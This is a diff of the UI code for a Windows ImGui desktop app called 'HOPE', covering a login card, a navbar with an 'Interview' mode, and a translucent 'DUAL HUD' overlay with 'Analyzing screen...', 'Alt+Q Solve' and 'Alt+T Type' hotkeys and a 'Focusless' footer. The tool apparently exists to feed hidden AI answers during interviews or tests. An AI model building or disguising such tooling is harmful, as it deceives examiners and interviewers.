+                ImGui::PushStyleColor(ImGuiCol_Text, s_showPassword ? ImVec4(g_uiColor.x, g_uiColor.y, g_uiColor.z, 1.0f) : ImVec4(0.65f, 0.70f, 0.80f, 0.9f));
+                if (ImGui::SmallButton(eyeLabel)) {
+                    s_showPassword = !s_showPassword;
+                }
+                if (ImGui::IsItemHovered()) ImGui::SetTooltip(s_showPassword ? "Hide password" : "Show password");
+                ImGui::PopStyleColor(2);
+                ImGui::PopStyleVar(2);
+            }
+        };
+
+        // Username Field
+        ImGui::SetCursorPosX(startX);
+        RenderLoginField("u_box", "Username", g_usernameBuffer, FocusState::Username, false);
+
+        ImGui::Spacing();
+        ImGui::SetCursorPosX(startX);
+        RenderLoginField("p_box", "Password", g_passwordBuffer, FocusState::Password, true);
+
+        ImGui::Spacing();
+
+        // Remember Me Checkbox Row
+        ImGui::SetCursorPosX(startX);
+        if (NeonCheckbox("##remember_me", &g_rememberMe)) {
+            SaveHotkeys();
+        }
+        ImGui::SameLine(0, 8.0f);
+        ImGui::AlignTextToFramePadding();
+        ImGui::Text("Remember me");
+
+        ImGui::Spacing();
+
+        // Sign In Button
+        ImGui::SetCursorPosX(startX);
+        if (NeoWaveButton("SIGN IN", ImVec2(contentW, 42.0f))) {
+            if (g_rememberMe) SaveHotkeys();
+            Api::PerformLogin(g_usernameBuffer, g_passwordBuffer);
+        }
+
+        ImGui::Spacing();
+        std::string verFooter = "v" + CURRENT_APP_VERSION + "  *  Focusless & Encrypted";
+        ImVec2 footSz = ImGui::CalcTextSize(verFooter.c_str());
+        ImGui::SetCursorPosX(cardX + (cardW - footSz.x) * 0.5f);
+        ImGui::TextDisabled("%s", verFooter.c_str());
+    }
+
+    ImGui::EndGroup();
 }
 
 
@@ -7395,8 +8195,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 ScreenToClient(g_hwnd, &pt);
                 RECT rc;
                 GetClientRect(g_hwnd, &rc);
-                // Click below toolbar (y>80) = WebView content area
-                if (pt.y > 80 && pt.x >= 0 && pt.x <= rc.right && pt.y <= rc.bottom) {
+                // Click below toolbar (y>74) = WebView content area
+                if (pt.y > 74 && pt.x >= 0 && pt.x <= rc.right && pt.y <= rc.bottom) {
                     g_currentFocus = FocusState::BrowserPage;
                 }
             }
@@ -7601,7 +8401,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         // --- APPLY TRANSPARENCY ---
         if (g_duelModeActive && g_appState == AppState::LoggedIn) {
-            SetLayeredWindowAttributes(g_hwnd, RGB(0, 0, 0), 255, LWA_COLORKEY);
+            SetLayeredWindowAttributes(g_hwnd, 0, (BYTE)(g_duelAlpha * 255), LWA_ALPHA);
         } else {
             SetLayeredWindowAttributes(g_hwnd, 0, (BYTE)(g_windowAlpha * 255), LWA_ALPHA);
         }
@@ -7621,21 +8421,35 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (ImGui::GetIO().DisplaySize.x <= 0.0f) ImGui::GetIO().DisplaySize.x = 1.0f;
         if (ImGui::GetIO().DisplaySize.y <= 0.0f) ImGui::GetIO().DisplaySize.y = 1.0f;
         ImGui::NewFrame();
+        {
+            ImGuiStyle& curStyle = ImGui::GetStyle();
+            curStyle.Colors[ImGuiCol_ButtonHovered] = ImVec4(g_uiColor.x * 0.35f, g_uiColor.y * 0.35f, g_uiColor.z * 0.35f, 1.0f);
+            curStyle.Colors[ImGuiCol_ButtonActive] = ImVec4(g_uiColor.x * 0.55f, g_uiColor.y * 0.55f, g_uiColor.z * 0.55f, 1.0f);
+            curStyle.Colors[ImGuiCol_HeaderHovered] = ImVec4(g_uiColor.x * 0.30f, g_uiColor.y * 0.30f, g_uiColor.z * 0.30f, 1.0f);
+            curStyle.Colors[ImGuiCol_HeaderActive] = ImVec4(g_uiColor.x * 0.45f, g_uiColor.y * 0.45f, g_uiColor.z * 0.45f, 1.0f);
+            curStyle.Colors[ImGuiCol_SeparatorHovered] = ImVec4(g_uiColor.x, g_uiColor.y, g_uiColor.z, 0.7f);
+            curStyle.Colors[ImGuiCol_SeparatorActive] = ImVec4(g_uiColor.x, g_uiColor.y, g_uiColor.z, 1.0f);
+            curStyle.Colors[ImGuiCol_SliderGrab] = ImVec4(g_uiColor.x * 0.75f, g_uiColor.y * 0.75f, g_uiColor.z * 0.75f, 1.0f);
+            curStyle.Colors[ImGuiCol_SliderGrabActive] = ImVec4(g_uiColor.x, g_uiColor.y, g_uiColor.z, 1.0f);
+            curStyle.Colors[ImGuiCol_CheckMark] = ImVec4(g_uiColor.x, g_uiColor.y, g_uiColor.z, 1.0f);
+        }
         DrawDimOverlayIfRequested();
 
         if (g_duelModeActive && g_appState == AppState::LoggedIn) {
-            int targetW = 380;
-            int targetH = 110;
-            if (!g_duelProcessing && !g_duelResponse.empty()) {
+            int targetW = 280;
+            int targetH = 34;
+            if (g_duelProcessing) {
+                targetW = 220; targetH = 34;
+            } else if (!g_duelResponse.empty()) {
                 size_t len = g_duelResponse.size();
                 if (len <= 80) {
-                    targetW = 420; targetH = 130;
+                    targetW = 380; targetH = 85;
                 } else if (len <= 250) {
-                    targetW = 560; targetH = 200;
+                    targetW = 500; targetH = 150;
                 } else if (len <= 600) {
-                    targetW = 700; targetH = 300;
+                    targetW = 640; targetH = 240;
                 } else {
-                    targetW = 850; targetH = 430;
+                    targetW = 760; targetH = 350;
                 }
             }
             int screenW = GetSystemMetrics(SM_CXSCREEN);
@@ -7658,54 +8472,78 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             ImGui::SetNextWindowSize(ImGui::GetIO().DisplaySize, ImGuiCond_Always);
             ImGui::SetNextWindowBgAlpha(0.0f);
 
-            ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.0f, 0.0f, 0.0f, 0.0f));
-            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.0f, 0.0f, 0.0f, 0.0f));
-            ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
-            ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
-            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(12.0f, 8.0f));
+            // Subtle translucent glass styling (no large opaque box or glaring neon borders)
+            ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.04f, 0.05f, 0.08f, 0.28f));
+            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.4f, 0.5f, 0.6f, 0.15f));
+            ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 1.0f);
+            ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 8.0f);
+            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(10.0f, 6.0f));
 
             ImGuiWindowFlags overlayFlags = ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoResize |
                                             ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoFocusOnAppearing;
 
             if (ImGui::Begin("##DuelOverlay", nullptr, overlayFlags)) {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 0.95f));
-                int duelLimit = GetChatMessageLimit();
-                std::string duelTitle = (duelLimit > 0)
-                    ? "DUAL [" + std::to_string(g_chatMessageCount) + "/" + std::to_string(duelLimit) + "]"
-                    : "DUAL";
-                ImGui::Text("%s", duelTitle.c_str());
-                ImGui::PopStyleColor();
-                ImGui::SameLine(ImGui::GetContentRegionAvail().x - 22.0f);
-                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.96f, 0.75f, 0.82f, 0.85f));
-                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.82f, 0.88f, 0.95f));
-                ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.65f, 0.75f, 1.0f));
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.25f, 0.05f, 0.1f, 1.0f));
-                if (ImGui::Button("X##exitduel", ImVec2(20.0f, 18.0f))) {
-                    g_isVisible = false;
-                    ShowWindow(g_hwnd, SW_HIDE);
-                }
-                ImGui::PopStyleColor(4);
-
-                ImGui::Spacing();
+                ImDrawList* dl = ImGui::GetWindowDrawList();
+                ImVec2 p = ImGui::GetCursorScreenPos();
 
                 if (g_duelProcessing) {
-                    float time = (float)ImGui::GetTime();
-                    int dots = ((int)(time * 3.0f)) % 4;
-                    std::string waitText = "Waiting for AI";
-                    for (int i = 0; i < dots; i++) waitText += ".";
-                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.9f, 0.9f, 0.3f, 1.0f));
-                    ImGui::Text("%s", waitText.c_str());
+                    dl->AddCircleFilled(p + ImVec2(5.0f, 10.0f), 3.5f, IM_COL32(250, 200, 50, 230));
+                    ImGui::SetCursorPosX(ImGui::GetCursorPosX() + 16.0f);
+                    ImGui::TextColored(ImVec4(1.0f, 0.85f, 0.3f, 0.9f), "Analyzing screen...");
+                }
+                else if (g_duelResponse.empty()) {
+                    // Ultra-minimal idle pill
+                    dl->AddCircleFilled(p + ImVec2(5.0f, 10.0f), 3.5f, IM_COL32(50, 220, 120, 230));
+                    ImGui::SetCursorPosX(ImGui::GetCursorPosX() + 16.0f);
+                    ImGui::TextDisabled("DUAL HUD  *  Alt+Q Solve  *  Alt+T Type");
+
+                    ImGui::SameLine(ImGui::GetWindowWidth() - 22.0f);
+                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0, 0, 0, 0));
+                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.6f, 0.6f, 0.6f, 0.8f));
+                    if (ImGui::SmallButton("x##exitduel")) {
+                        DeactivateDuelMode();
+                    }
+                    if (ImGui::IsItemHovered()) ImGui::SetTooltip("Exit Dual Mode");
+                    ImGui::PopStyleColor(2);
+                }
+                else {
+                    // Solution HUD
+                    dl->AddCircleFilled(p + ImVec2(5.0f, 10.0f), 3.5f, IM_COL32(50, 220, 120, 230));
+                    ImGui::SetCursorPosX(ImGui::GetCursorPosX() + 16.0f);
+                    ImGui::TextColored(g_uiColor, "DUAL");
+
+                    ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
+                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.16f, 0.18f, 0.24f, 0.85f));
+                    if (ImGui::SmallButton("Copy##duelcopy")) {
+                        if (OpenClipboard(NULL)) {
+                            EmptyClipboard();
+                            size_t sz = g_duelResponse.size() + 1;
+                            HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, sz);
+                            if (hGlob) {
+                                memcpy(GlobalLock(hGlob), g_duelResponse.c_str(), sz);
+                                GlobalUnlock(hGlob);
+                                SetClipboardData(CF_TEXT, hGlob);
+                            }
+                            CloseClipboard();
+                        }
+                    }
+                    if (ImGui::IsItemHovered()) ImGui::SetTooltip("Copy solution to clipboard");
+
+                    ImGui::SameLine(0, 4.0f);
+                    if (ImGui::SmallButton("x##exitduel")) {
+                        DeactivateDuelMode();
+                    }
+                    if (ImGui::IsItemHovered()) ImGui::SetTooltip("Exit Dual Mode");
                     ImGui::PopStyleColor();
-                } else if (g_duelResponse.empty()) {
-                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.8f, 0.8f, 0.8f, 0.9f));
-                    ImGui::Text("Press hotkey to recapture");
-                    ImGui::PopStyleColor();
-                } else {
-                    ImGui::PushTextWrapPos(ImGui::GetContentRegionAvail().x);
-                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
-                    ImGui::Text("%s", g_duelResponse.c_str());
+
+                    ImGui::Spacing();
+                    ImGui::BeginChild("##DuelRespScroll", ImVec2(0.0f, 0.0f), false);
+                    ImGui::PushTextWrapPos(ImGui::GetContentRegionAvail().x - 4.0f);
+                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.96f, 0.97f, 1.0f, 0.95f));
+                    ImGui::TextUnformatted(g_duelResponse.c_str());
                     ImGui::PopStyleColor();
                     ImGui::PopTextWrapPos();
+                    ImGui::EndChild();
                 }
             }
             ImGui::End();
@@ -7745,14 +8583,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         // Inner subtle border
         d->AddRect(ImVec2(1, 1), ImGui::GetIO().DisplaySize - ImVec2(1, 1), IM_COL32(255, 255, 255, 10), 11.0f, 0, 1.0f);
 
-        // Premium gradient header (top 50px)
-        ImVec2 headerMax = ImVec2(ImGui::GetIO().DisplaySize.x, 50.0f);
-        ImU32 headerTop = IM_COL32(25, 25, 28, 255);
-        ImU32 headerBot = IM_COL32(20, 20, 23, 255);
+        // Dynamic gradient header height: Browser mode has Row 1 (navbar) + Row 2 (search) = 74px, others 36px
+        float currentHeaderH = (g_appState == AppState::LoggedIn && g_appMode == AppMode::Browser && !g_showSettings) ? 74.0f : 36.0f;
+        ImVec2 headerMax = ImVec2(ImGui::GetIO().DisplaySize.x, currentHeaderH);
+        ImU32 headerTop = IM_COL32(20, 22, 28, 255);
+        ImU32 headerBot = IM_COL32(14, 16, 21, 255);
         d->AddRectFilledMultiColor(ImVec2(0, 0), headerMax, headerTop, headerTop, headerBot, headerBot);
 
         // Subtle accent line under header
-        d->AddLine(ImVec2(16, 49), ImVec2(ImGui::GetIO().DisplaySize.x - 16, 49), GetAccentColorU32(0.3f), 1.0f);
+        d->AddLine(ImVec2(12, currentHeaderH - 1), ImVec2(ImGui::GetIO().DisplaySize.x - 12, currentHeaderH - 1), GetAccentColorU32(0.35f), 1.0f);
 
         ImGui::SetNextWindowPos({ 0.0f, 0.0f }); ImGui::SetNextWindowSize(ImGui::GetIO().DisplaySize);
         ImGui::Begin("Ghost", NULL, ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoResize);
@@ -7780,133 +8619,100 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             g_stagingReady = false;
         }
 
-        std::string titleVer = "Hope";
-        if (g_userTier == "free") {
-            titleVer += " (Community Edition)";
-            ImGui::TextDisabled(titleVer.c_str());
-        }
-        else if (g_userTier == "pro") {
-            titleVer += " (Pro Version)";
-            ImGui::TextDisabled(titleVer.c_str());
-        }
-        else if (g_userTier == "elite") {
-            titleVer += " (Elite Version)";
-            ImGui::TextDisabled(titleVer.c_str());
-        }
-        else if (g_userTier == "ultra") {
-            titleVer += " (Ultra Version)";
-            ImGui::TextDisabled(titleVer.c_str());
-        }
-        else {
-            ImGui::TextDisabled(titleVer.c_str());
-        }
+        bool isLoggedIn = (g_appState == AppState::LoggedIn);
 
-        // --- Screenshot captured flash (same line as title) ---
-        if (g_appMode == AppMode::Browser && g_screenshotFlashTick > 0) {
+        // ====================================================
+        // ROW 1: TOP NAVBAR (BRAND + MODES + SETTINGS / CLOSE)
+        // ====================================================
+        ImGui::SetCursorPos(ImVec2(12.0f, 6.0f));
+        ImGui::TextColored(g_uiColor, "HOPE");
+        ImGui::SameLine(0, 6.0f);
+
+        std::string tierBadge = "COMMUNITY";
+        if (g_userTier == "pro") tierBadge = "PRO";
+        else if (g_userTier == "elite") tierBadge = "ELITE";
+        else if (g_userTier == "ultra") tierBadge = "ULTRA";
+        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(g_uiColor.x * 0.15f, g_uiColor.y * 0.15f, g_uiColor.z * 0.15f, 0.8f));
+        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(g_uiColor.x, g_uiColor.y, g_uiColor.z, 0.95f));
+        ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 4.0f);
+        ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(5.0f, 1.0f));
+        ImGui::SmallButton(tierBadge.c_str());
+        ImGui::PopStyleVar(2);
+        ImGui::PopStyleColor(2);
+
+        // Screenshot flash or timer info
+        if (g_screenshotFlashTick > 0) {
             ULONGLONG elapsed = GetTickCount64() - g_screenshotFlashTick;
             if (elapsed < 2000) {
                 float alpha = 1.0f - (float)elapsed / 2000.0f;
-                ImGui::SameLine(0, 12.0f);
-                ImGui::TextColored(ImVec4(0.3f, 0.9f, 0.4f, alpha), "Screenshot Captured!");
+                ImGui::SameLine(0, 8.0f);
+                ImGui::TextColored(ImVec4(0.3f, 0.95f, 0.45f, alpha), "Snapped!");
             } else {
                 g_screenshotFlashTick = 0;
             }
         }
+        else if (isLoggedIn && g_appMode == AppMode::Browser && g_userTier != "ultra") {
+            ULONGLONG remaining = GetBrowserRemainingMs();
+            if (remaining > 0 && remaining != ULLONG_MAX) {
+                ImGui::SameLine(0, 8.0f);
+                ImGui::TextDisabled("(%s)", FormatMsToMinSec(remaining).c_str());
+            } else if (remaining == 0) {
+                ImGui::SameLine(0, 8.0f);
+                ImGui::TextColored(ImVec4(0.95f, 0.35f, 0.35f, 1.0f), "Expired");
+            }
+        }
 
-        // --- Tier status line ---
-        {
-            std::string info;
-            // Browser timer (show when in browser mode, for tiers with limits)
-            if (g_appMode == AppMode::Browser && g_userTier != "ultra") {
-                ULONGLONG remaining = GetBrowserRemainingMs();
-                if (remaining > 0 && remaining != ULLONG_MAX) {
-                    info += "Browser: " + FormatMsToMinSec(remaining) + " left";
-                } else if (remaining == 0) {
-                    ImGui::TextColored(ImVec4(0.9f, 0.4f, 0.4f, 1.0f), "Browser time expired");
-                    info = ""; // skip further display
+        // Mode Navigation Pills on Top Row
+        if (isLoggedIn && !g_showSettings) {
+            ImGui::SameLine(0, 8.0f);
+
+            auto RenderModePill = [](const char* name, AppMode mode, bool enabled = true, const char* disabledTip = nullptr) {
+                bool isCur = (g_appMode == mode);
+                if (!enabled) ImGui::BeginDisabled();
+                
+                ImVec4 bgCol = isCur ? ImVec4(g_uiColor.x * 0.30f, g_uiColor.y * 0.30f, g_uiColor.z * 0.30f, 0.95f)
+                                     : ImVec4(0.11f, 0.13f, 0.17f, 0.75f);
+                ImVec4 txtCol = isCur ? ImVec4(1.0f, 1.0f, 1.0f, 1.0f) : ImVec4(0.68f, 0.71f, 0.77f, 0.9f);
+                
+                ImGui::PushStyleColor(ImGuiCol_Button, bgCol);
+                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(g_uiColor.x * 0.42f, g_uiColor.y * 0.42f, g_uiColor.z * 0.42f, 1.0f));
+                ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(g_uiColor.x * 0.55f, g_uiColor.y * 0.55f, g_uiColor.z * 0.55f, 1.0f));
+                ImGui::PushStyleColor(ImGuiCol_Text, txtCol);
+                ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 5.0f);
+                ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(7.0f, 2.0f));
+                
+                std::string btnId = std::string(name) + "##nav_pill";
+                if (ImGui::Button(btnId.c_str())) {
+                    SwitchMode(mode);
                 }
-            }
-            // Chat message count (for free/pro)
-            int chatLimit = GetChatMessageLimit();
-            if (chatLimit > 0) {
-                std::string chatInfo = "Chat: " + std::to_string(g_chatMessageCount) + "/" + std::to_string(chatLimit) + " used";
-                if (!info.empty()) info += " | ";
-                info += chatInfo;
-            }
-            if (!info.empty()) {
-                ImGui::TextColored(ImVec4(0.8f, 0.8f, 0.6f, 1.0f), info.c_str());
-            }
+                
+                ImGui::PopStyleVar(2);
+                ImGui::PopStyleColor(4);
+                
+                if (!enabled) {
+                    ImGui::EndDisabled();
+                    if (disabledTip && ImGui::IsItemHovered(ImGuiHoveredFlags_AllowWhenDisabled)) {
+                        ImGui::SetTooltip("%s", disabledTip);
+                    }
+                }
+                ImGui::SameLine(0, 4.0f);
+            };
+
+            bool hasBrowser = IsBrowserTimeAvailable();
+            RenderModePill("Browser", AppMode::Browser, hasBrowser, "Browser time limit reached for this session");
+            RenderModePill("Chat", AppMode::Chat);
+            RenderModePill("Interview", AppMode::Interview);
+            RenderModePill("Agent", AppMode::Agent);
+            RenderModePill("Dual", AppMode::Duel);
         }
 
+        // Right side: Settings & Close
+        float rightW = 20.0f; // close
+        if (isLoggedIn) rightW += 22.0f + 6.0f; // settings + gap
+        ImGui::SetCursorPos(ImVec2(ImGui::GetWindowWidth() - rightW - 10.0f, 6.0f));
 
-        // --- TITLE BAR: Browser Back/Fwd (centered) + Settings + Close ---
-        bool isLoggedIn = (g_appState == AppState::LoggedIn);
-        bool showBrowserBtns = (isLoggedIn && g_appMode == AppMode::Browser && !g_showSettings);
-
-        // Right side: settings + close
-        float rightSectionW = 20.0f; // close button
-        if (isLoggedIn) rightSectionW += 26.0f + 6.0f; // settings + gap
-        ImGui::SameLine(ImGui::GetWindowWidth() - rightSectionW - 8.0f);
-        float rightStartX = ImGui::GetCursorPosX(); // save position for after center buttons
-
-        // Browser back/forward buttons CENTERED in title bar
-        if (showBrowserBtns) {
-            float btnW = 70.0f;
-            float btnH = 22.0f;
-            float gap = 6.0f;
-            float totalW = btnW * 2 + gap;
-            float centerX = (ImGui::GetWindowWidth() - totalW) * 0.5f;
-
-            ImGui::SameLine(centerX);
-            ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 6.0f);
-            ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(8.0f, 3.0f));
- 
-            // Back button
-            bool backOff = !g_browserCanGoBack;
-            if (backOff) {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.35f, 0.35f, 0.35f, 1.0f));
-                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.12f, 0.12f, 0.14f, 1.0f));
-            } else {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
-                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.18f, 0.18f, 0.22f, 1.0f));
-            }
-            if (ImGui::Button("< Back##tb_back", ImVec2(btnW, btnH)) && (!backOff || g_proxyModeActive)) {
-                if (g_proxyModeActive) {
-                    std::lock_guard<std::mutex> lock(g_proxyMutex);
-                    ProxyCommand cmd; cmd.type = ProxyCommand::ExecuteScript; cmd.strParam = "history.back()";
-                    g_proxyCommands.push_back(cmd);
-                } else if (g_webview) g_webview->GoBack();
-            }
-            ImGui::PopStyleColor(2);
-            ImGui::SameLine(0, gap);
- 
-            // Forward button
-            bool fwdOff = !g_browserCanGoForward;
-            if (fwdOff) {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.35f, 0.35f, 0.35f, 1.0f));
-                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.12f, 0.12f, 0.14f, 1.0f));
-            } else {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
-                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.18f, 0.18f, 0.22f, 1.0f));
-            }
-            if (ImGui::Button("Fwd >##tb_fwd", ImVec2(btnW, btnH)) && (!fwdOff || g_proxyModeActive)) {
-                if (g_proxyModeActive) {
-                    std::lock_guard<std::mutex> lock(g_proxyMutex);
-                    ProxyCommand cmd; cmd.type = ProxyCommand::ExecuteScript; cmd.strParam = "history.forward()";
-                    g_proxyCommands.push_back(cmd);
-                } else if (g_webview) g_webview->GoForward();
-            }
-            ImGui::PopStyleColor(2);
-
-            ImGui::PopStyleVar(2);
-        }
-
-        // Settings + Close (always right-aligned)
-        ImGui::SameLine(rightStartX);
-
-        // Settings button (bigger, 26x26)
         if (isLoggedIn && g_icons.Settings) {
-            ImVec2 setBtnSize = { 26.0f, 26.0f };
+            ImVec2 setBtnSize = { 20.0f, 20.0f };
             ImVec2 sp = ImGui::GetCursorScreenPos();
             if (ImGui::InvisibleButton("##settings_titlebar", setBtnSize)) {
                 if (g_appMode == AppMode::Browser && !g_showSettings) {
@@ -7920,84 +8726,132 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 }
             }
             bool setHovered = ImGui::IsItemHovered();
-            bool setActive = ImGui::IsItemActive();
-            ImU32 setTint = g_showSettings ? GetAccentColorU32() : (setHovered ? IM_COL32(255, 255, 255, 255) : IM_COL32(200, 200, 200, 255));
-            if (setActive) setTint = GetAccentColorU32();
+            ImU32 setTint = g_showSettings ? GetAccentColorU32() : (setHovered ? IM_COL32(255, 255, 255, 255) : IM_COL32(180, 180, 190, 255));
             ImGui::GetWindowDrawList()->AddImage(g_icons.Settings, sp, sp + setBtnSize, ImVec2(0.0f, 0.0f), ImVec2(1.0f, 1.0f), setTint);
             ImGui::SameLine(0.0f, 6.0f);
         }
- 
+
         if (g_icons.Close) {
-            ImVec2 btnSize = { 20.0f, 20.0f };
+            ImVec2 btnSize = { 18.0f, 18.0f };
             ImVec2 p = ImGui::GetCursorScreenPos();
+            p.y += 1.0f;
             if (ImGui::InvisibleButton("##close_app", btnSize)) done = true;
             bool hovered = ImGui::IsItemHovered();
-            bool active = ImGui::IsItemActive();
-            ImU32 tint = hovered ? IM_COL32(255, 50, 50, 255) : IM_COL32(150, 150, 150, 255);
-            if (active) tint = IM_COL32(200, 0, 0, 255);
+            ImU32 tint = hovered ? IM_COL32(255, 70, 70, 255) : IM_COL32(160, 160, 160, 255);
             ImGui::GetWindowDrawList()->AddImage(g_icons.Close, p, p + btnSize, ImVec2(0.0f, 0.0f), ImVec2(1.0f, 1.0f), tint);
         }
         else {
-            ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.8f, 0.2f, 0.2f, 1.0f));
-            if (ImGui::Button("X", { 25.0f, 22.0f })) done = true;
+            ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.85f, 0.25f, 0.25f, 1.0f));
+            if (ImGui::Button("X", { 20.0f, 20.0f })) done = true;
             ImGui::PopStyleColor();
         }
 
-        // --- FIX: USE UI COLOR FOR SEPARATOR TO AVOID WHITE ---
-        ImGui::PushStyleColor(ImGuiCol_Separator, g_uiColor);
-        ImGui::Separator();
-        ImGui::PopStyleColor();
-        ImGui::Spacing();
- 
-        if (g_appState == AppState::Login) {
-            ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0.0f, 5.0f));
-            float blockH = ImGui::GetTextLineHeightWithSpacing() + 10.0f + 55.0f + 10.0f + 55.0f + 10.0f + 55.0f;
-            float startY = (ImGui::GetWindowHeight() - blockH) / 2.0f; if (startY < 50.0f) startY = 50.0f;
-            ImGui::SetCursorPosY(startY);
+        // ====================================================
+        // ROW 2: SEARCH BAR (UNDERNEATH NAVBAR, BROWSER MODE ONLY)
+        // ====================================================
+        if (isLoggedIn && g_appMode == AppMode::Browser && !g_showSettings) {
+            ImGui::SetCursorPos(ImVec2(12.0f, 38.0f));
+            ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 5.0f);
+            ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(5.0f, 3.0f));
 
-            if (g_checkingVersion) {
-                ImGui::TextColored(ImVec4(1.0f, 0.85f, 0.0f, 1.0f), "Checking Version...");
-                DrawThinkingLoader();
+            // Back button
+            bool canBack = g_browserCanGoBack || g_proxyModeActive;
+            if (!canBack) ImGui::BeginDisabled();
+            if (ImGui::Button("<##nav_back", ImVec2(24.0f, 24.0f))) {
+                if (g_proxyModeActive) {
+                    std::lock_guard<std::mutex> lock(g_proxyMutex);
+                    ProxyCommand cmd; cmd.type = ProxyCommand::ExecuteScript; cmd.strParam = "history.back()";
+                    g_proxyCommands.push_back(cmd);
+                } else if (g_webview) g_webview->GoBack();
             }
-            else if (g_updateRequired) {
-                ImGui::TextColored(ImVec4(1.0f, 0.2f, 0.2f, 1.0f), "MANDATORY UPDATE REQUIRED");
-                ImGui::Spacing();
-                ImGui::TextWrapped("A new version is available. Please update to continue.");
-                ImGui::Spacing();
-                ImGui::Spacing();
-                if (NeoWaveButton("DOWNLOAD UPDATE", { ImGui::GetContentRegionAvail().x, 55.0f })) {
-                    if (Api::LaunchMandatoryUpdateInstaller()) {
-                        done = true; // Close app after launching installer
-                    }
-                    else {
-                        g_statusMessage = "Failed to launch installer.";
-                    }
-                }
+            if (!canBack) ImGui::EndDisabled();
+            ImGui::SameLine(0, 4.0f);
+
+            // Forward button
+            bool canFwd = g_browserCanGoForward || g_proxyModeActive;
+            if (!canFwd) ImGui::BeginDisabled();
+            if (ImGui::Button(">##nav_fwd", ImVec2(24.0f, 24.0f))) {
+                if (g_proxyModeActive) {
+                    std::lock_guard<std::mutex> lock(g_proxyMutex);
+                    ProxyCommand cmd; cmd.type = ProxyCommand::ExecuteScript; cmd.strParam = "history.forward()";
+                    g_proxyCommands.push_back(cmd);
+                } else if (g_webview) g_webview->GoForward();
             }
-            else {
-                ImGui::TextColored(ImVec4(1.0f, 0.85f, 0.0f, 1.0f), g_statusMessage.c_str());
-                ImGui::Spacing();
+            if (!canFwd) ImGui::EndDisabled();
+            ImGui::SameLine(0, 4.0f);
 
-                bool dummySend;
-                FloatingInputGhost("u_box", "Username", g_usernameBuffer, FocusState::Username, false, dummySend);
-                ImGui::Spacing();
-                FloatingInputGhost("p_box", "Password", g_passwordBuffer, FocusState::Password, false, dummySend);
-                ImGui::Spacing();
+            // Reload button
+            if (ImGui::Button("R##nav_reload", ImVec2(24.0f, 24.0f))) {
+                if (g_webview) g_webview->Reload();
+            }
+            if (ImGui::IsItemHovered()) ImGui::SetTooltip("Reload page");
+            ImGui::SameLine(0, 6.0f);
 
-                if (NeoWaveButton("LOG IN", { ImGui::GetContentRegionAvail().x, 55.0f })) { Api::PerformLogin(g_usernameBuffer, g_passwordBuffer); }
+            // Responsive URL address bar
